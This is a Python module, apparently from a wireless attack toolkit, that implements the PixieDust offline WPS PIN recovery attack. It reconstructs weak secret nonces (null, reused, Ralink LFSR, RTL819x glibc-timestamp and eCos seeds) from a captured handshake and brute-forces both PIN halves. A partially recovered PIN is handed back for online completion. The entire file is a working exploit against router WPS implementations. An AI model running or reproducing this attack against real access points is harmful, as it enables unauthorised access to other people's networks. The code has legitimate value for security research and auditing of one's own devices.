"""Native PixieDust offline PIN recovery: tries the weak-entropy cases of the WPS M3 secret
nonces (null, nonce-reuse, Ralink LFSR, RTL819x glibc timestamp) and brute-forces the PIN halves
offline. Pure/CPU-bound and self-contained, so a caller can run it in a worker process.
"""

from __future__ import annotations

import time
from dataclasses import dataclass
from enum import Enum, auto
from typing import Iterable, List, Optional, Tuple

from wifit3.campaigns.wps import pins, pixie_prng
from wifit3.dot11.wsc import crypto as wc


class PixieMode(Enum):
    NULL_SECRET = auto()
    STATIC_SECRET = auto()
    RALINK = auto()
    RTL819X = auto()
    ECOS_SIMPLE = auto()   # experimental; not in DEFAULT_MODES (the seed sweep is 2^25)


@dataclass(frozen=True)
class PixieBundle:
    pke: bytes
    pkr: bytes
    e_hash1: bytes
    e_hash2: bytes
    e_nonce: bytes
    authkey: bytes
    enrollee_mac: bytes | None = None


@dataclass(frozen=True)
class PixieResult:
    pin: str | None = None
    mode: PixieMode | None = None
    found: bool = False
    # A proven first PIN half, set when PixieDust pinned P1 but not P2 (RTL819x E-S2 seed out of
    # range): the caller locks it and finishes the second half online. See campaigns/pin.py.
    first_half: str | None = None


@dataclass(frozen=True)
class _Found:
    """One mode's outcome: a full ``pin``, a proven ``first_half`` only, or neither."""
    pin: Optional[str] = None
    first_half: Optional[str] = None


SecretPair = tuple[bytes, bytes]

NULL_SECRET_PAIR: SecretPair = (b"\x00" * wc.SECRET_NONCE_LEN, b"\x00" * wc.SECRET_NONCE_LEN)

# All modes, in the order a live capture should try them: the two instant table lookups, the
# deterministic Ralink reconstruction, then the (bounded) RTL819x timestamp search.
DEFAULT_MODES = (
    PixieMode.NULL_SECRET, PixieMode.STATIC_SECRET, PixieMode.RALINK, PixieMode.RTL819X,
)

# RTL819x: E-S1's seed lies within this many seconds of the nonce seed, E-S2's a few seconds after.
_RTL_ES1_SPAN = 600
_RTL_ES2_SPAN = 10
# Default nonce-seed search: +/- a day around now (the enrollee seeds glibc random() from time()).
_RTL_WINDOW_SEC = 86400
# eCos simple: top 7 seed bits come from the nonce, leaving a 25-bit sweep.
_ECOS_MAX_COUNTER = 0x02000000


class _HalfOracle:
    """Per-recovery PIN-half PSK cache: a half's PSK depends only on the AuthKey, so it is built
    once and reused across every candidate secret nonce (the RTL819x win)."""

    def __init__(self, bundle: PixieBundle):
        self.bundle = bundle
        self.empty_psk = wc.hmac_sha256(bundle.authkey, b"")[:wc.PSK_LEN]
        self._psk: List[bytes] = []

    def psk(self, value: int) -> bytes:
        """first16(HMAC_AuthKey("%04d")) for a 4-digit half; built lazily and shared by P1 and P2
        (a half's PSK is the HMAC of its digits, the same whichever half it is)."""
        while len(self._psk) <= value:
            half = f"{len(self._psk):04d}".encode("ascii")
            self._psk.append(wc.hmac_sha256(self.bundle.authkey, half)[:wc.PSK_LEN])
        return self._psk[value]

    def matches(self, secret_nonce: bytes, psk: bytes, expected_hash: bytes) -> bool:
        """Does ``psk`` under ``secret_nonce`` reproduce the captured E-Hash?"""
        got = wc.e_or_r_hash(self.bundle.authkey, secret_nonce, psk,
                             self.bundle.pke, self.bundle.pkr)
        return got == expected_hash


def recover_pin(
    bundle: PixieBundle,
    modes: Iterable[PixieMode] = DEFAULT_MODES,
    static_secrets: Iterable[SecretPair] = (),
    rtl_window: Optional[Tuple[int, int]] = None,
    ecos_max_counter: int = _ECOS_MAX_COUNTER,
) -> PixieResult:
    """Try each PixieDust ``mode`` against a captured M3 ``bundle``; the first full PIN wins. If no
    mode yields a full PIN but one proved a first half, that half is returned to finish online."""
    oracle = _HalfOracle(bundle)
    partial: Optional[Tuple[str, PixieMode]] = None
    secret_pairs = tuple(static_secrets)
    for mode in modes:
        found = _recover_one(oracle, mode, secret_pairs, rtl_window, ecos_max_counter)
        if found.pin is not None:
            return PixieResult(pin=found.pin, mode=mode, found=True)
        if found.first_half is not None and partial is None:
            partial = (found.first_half, mode)
    if partial is not None:
        return PixieResult(first_half=partial[0], mode=partial[1])
    return PixieResult()


def _recover_one(
    oracle: _HalfOracle, mode: PixieMode, static_secrets: Tuple[SecretPair, ...],
    rtl_window: Optional[Tuple[int, int]], ecos_max_counter: int,
) -> _Found:
    if mode is PixieMode.NULL_SECRET:
        return _Found(pin=_recover_with_secret_pair(oracle, NULL_SECRET_PAIR))
    if mode is PixieMode.STATIC_SECRET:
        for pair in (static_secrets or _static_secret_pairs(oracle.bundle)):
            pin = _recover_with_secret_pair(oracle, pair)
            if pin is not None:
                return _Found(pin=pin)
        return _Found()
    if mode is PixieMode.RALINK:
        return _Found(pin=_recover_ralink(oracle))
    if mode is PixieMode.RTL819X:
        return _recover_rtl819x(oracle, rtl_window)
    if mode is PixieMode.ECOS_SIMPLE:
        return _Found(pin=_recover_ecos_simple(oracle, ecos_max_counter))
    return _Found()


def _static_secret_pairs(bundle: PixieBundle) -> Tuple[SecretPair, ...]:
    """Known constant secret pairs. Some enrollees reuse the Enrollee nonce as both secrets."""
    nonce = bundle.e_nonce
    if nonce and len(nonce) == wc.SECRET_NONCE_LEN:
        return ((nonce, nonce),)
    return ()


def _recover_ralink(oracle: _HalfOracle) -> Optional[str]:
    """Ralink/MediaTek: rebuild E-S1/E-S2 from the nonce's LFSR state, then brute the PIN halves."""
    secrets = pixie_prng.ralink_recover(oracle.bundle.e_nonce)
    if secrets is None:
        return None
    return _recover_with_secret_pair(oracle, secrets)


def _recover_ecos_simple(oracle: _HalfOracle, max_counter: int) -> Optional[str]:
    """eCos "simple" (experimental): sweep the 25-bit seed for E-S1/E-S2, then brute the halves."""
    secrets = pixie_prng.ecos_simple_recover(oracle.bundle.e_nonce, max_counter)
    if secrets is None:
        return None
    return _recover_with_secret_pair(oracle, secrets)


def _recover_rtl819x(oracle: _HalfOracle, rtl_window: Optional[Tuple[int, int]]) -> _Found:
    """RTL819x: find the glibc timestamp seed behind the nonce, then the nearby seeds for E-S1 and
    E-S2. A first half proved against E-Hash1 escapes as a partial even if E-S2's seed is missed."""
    nonce = oracle.bundle.e_nonce
    if len(nonce) != wc.SECRET_NONCE_LEN:
        return _Found()
    # glibc random() is 31-bit, so each 4-byte word of a genuine RTL819x nonce has its top bit clear.
    if nonce[0] & 0x80 or nonce[4] & 0x80 or nonce[8] & 0x80 or nonce[12] & 0x80:
        return _Found()
    start, end = rtl_window if rtl_window is not None else _default_rtl_window()
    nonce_seed = pixie_prng.find_glibc_nonce_seed(nonce, start, end)
    if nonce_seed is None:
        return _Found()

    first4: Optional[str] = None
    s1_seed = nonce_seed
    for dist in range(_RTL_ES1_SPAN + 1):
        candidates = (nonce_seed,) if dist == 0 else (nonce_seed + dist, nonce_seed - dist)
        for cand in candidates:
            found = _find_first_half(oracle, pixie_prng.glibc_nonce(cand))
            if found is not None:
                first4, s1_seed = found, cand
                break
        if first4 is not None:
            break
    if first4 is None:
        return _Found()

    for j in range(_RTL_ES2_SPAN):
        pin = _find_second_half(oracle, pixie_prng.glibc_nonce(s1_seed + j), first4)
        if pin is not None:
            return _Found(pin=pin)
    return _Found(first_half=first4)


def _default_rtl_window() -> Tuple[int, int]:
    now = int(time.time())
    return (now + _RTL_WINDOW_SEC, now - _RTL_WINDOW_SEC)


def _recover_with_secret_pair(oracle: _HalfOracle, secret_pair: SecretPair) -> Optional[str]:
    e_s1, e_s2 = secret_pair
    first4 = _find_first_half(oracle, e_s1)
    if first4 is None:
        return None
    return _find_second_half(oracle, e_s2, first4)


def _find_first_half(oracle: _HalfOracle, e_s1: bytes) -> Optional[str]:
    """The 4-digit P1 whose PSK1 reproduces E-Hash1, or "" for a zero-length device password."""
    e_hash1 = oracle.bundle.e_hash1
    if oracle.matches(e_s1, oracle.empty_psk, e_hash1):
        return ""
    for value in range(10_000):
        if oracle.matches(e_s1, oracle.psk(value), e_hash1):
            return f"{value:04d}"
    return None


def _find_second_half(oracle: _HalfOracle, e_s2: bytes, first4: str) -> Optional[str]:
    """The full PIN completing ``first4`` whose PSK2 reproduces E-Hash2 (all 10000 second halves,
    not just the 1000 checksum-valid ones); ``first4`` itself for an empty zero-length password."""
    e_hash2 = oracle.bundle.e_hash2
    if oracle.matches(e_s2, oracle.empty_psk, e_hash2):
        return first4
    for value in range(10_000):
        if oracle.matches(e_s2, oracle.psk(value), e_hash2):
            return pins.join_halves(first4, f"{value:04d}")
    return None
